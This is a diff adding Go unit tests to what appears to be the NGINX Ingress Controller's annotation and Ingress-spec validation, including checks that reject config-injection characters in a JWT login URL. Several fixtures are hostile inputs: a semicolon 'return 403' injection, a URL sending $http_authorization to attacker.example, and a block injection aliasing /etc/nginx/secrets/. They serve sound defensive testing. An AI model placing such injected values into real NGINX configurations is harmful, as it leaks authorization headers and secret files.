@@ -351,6 +351,11 @@ func TestValidateIngress(t *testing.T) {
 									Paths: []networking.HTTPIngressPath{
 										{
 											Path: "/",
+											Backend: networking.IngressBackend{
+												Service: &networking.IngressServiceBackend{
+													Name: "test-svc",
+												},
+											},
 										},
 									},
 								},
@@ -3001,6 +3006,81 @@ func TestValidateNginxIngressAnnotations(t *testing.T) {
 
 		{
 			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "https://login.example.com/path;return%20403",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                true,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://login.example.com/path;return%%20403": must not contain characters that could cause NGINX config injection (;, {, }, $, newline, carriage return, or backtick)`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, contains semicolon injection", configs.JWTLoginURLAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "https://attacker.example/leak?a=$http_authorization",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                true,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://attacker.example/leak?a=$http_authorization": must not contain characters that could cause NGINX config injection (;, {, }, $, newline, carriage return, or backtick)`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, contains dollar sign variable expansion", configs.JWTLoginURLAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "https://h/x;}location /pwned {alias /etc/nginx/secrets/;",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                true,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://h/x;}location /pwned {alias /etc/nginx/secrets/;": must not contain characters that could cause NGINX config injection (;, {, }, $, newline, carriage return, or backtick)`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, contains braces and semicolons for block injection", configs.JWTLoginURLAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "https://login.example.com/path with spaces",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                true,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://login.example.com/path with spaces": must not contain spaces, quotes, backslashes, hash or tab characters`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, contains spaces", configs.JWTLoginURLAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "https://login.example.com/path#test",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                true,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://login.example.com/path#test": must not contain spaces, quotes, backslashes, hash or tab characters`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, contains hash character", configs.JWTLoginURLAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
 				"nginx.org/listen-ports": "80,8080,9090,44313",
 			},
 			specServices:          map[string]bool{},
@@ -5192,6 +5272,43 @@ func TestValidateIngressSpec(t *testing.T) {
 		},
 		{
 			spec: &networking.IngressSpec{
+				DefaultBackend: &networking.IngressBackend{},
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeRequired,
+			},
+			msg: "empty default backend with nil service",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path:    "/",
+										Backend: networking.IngressBackend{},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeRequired,
+			},
+			msg: "empty path backend with nil service",
+		},
+		{
+			spec: &networking.IngressSpec{
 				Rules: []networking.IngressRule{
 					{
 						Host: "foo.example.com",
@@ -5248,6 +5365,104 @@ func TestValidateIngressSpec(t *testing.T) {
 	for _, test := range tests {
 		allErrs := validateIngressSpec(test.spec, field.NewPath("spec"), test.allowEmptyIngressHost)
 		assertion := assertErrorTypes(test.msg, allErrs, test.expectedErrors)
+		if assertion != "" {
+			t.Error(assertion)
+		}
+	}
+}
+
+func TestValidateChallengeIngress(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		spec           *networking.IngressSpec
+		expectedErrors []string
+		msg            string
+	}{
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+										Backend: networking.IngressBackend{
+											Service: &networking.IngressServiceBackend{
+												Name: "svc",
+												Port: networking.ServiceBackendPort{Number: 8080},
+											},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: nil,
+			msg:            "valid input",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+										Backend: networking.IngressBackend{
+											Resource: &v1.TypedLocalObjectReference{},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []string{
+				`spec.rules.HTTP.Paths[0].Backend.Service: Required value: challenge Ingress must have a Backend Service defined`,
+			},
+			msg: "resource backend is rejected",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+										Backend: networking.IngressBackend{
+											Service: &networking.IngressServiceBackend{
+												Name: "svc",
+												Port: networking.ServiceBackendPort{Name: "http"},
+											},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []string{
+				`spec.rules.HTTP.Paths[0].Backend.Service.Port.Name: Forbidden: challenge Ingress must have a Backend Service Port Number defined, not Name`,
+			},
+			msg: "named service port is forbidden",
+		},
+	}
+
+	for _, test := range tests {
+		allErrs := validateChallengeIngress(test.spec, field.NewPath("spec"))
+		assertion := assertErrors("validateChallengeIngress()", test.msg, allErrs, test.expectedErrors)
 		if assertion != "" {
 			t.Error(assertion)
 		}
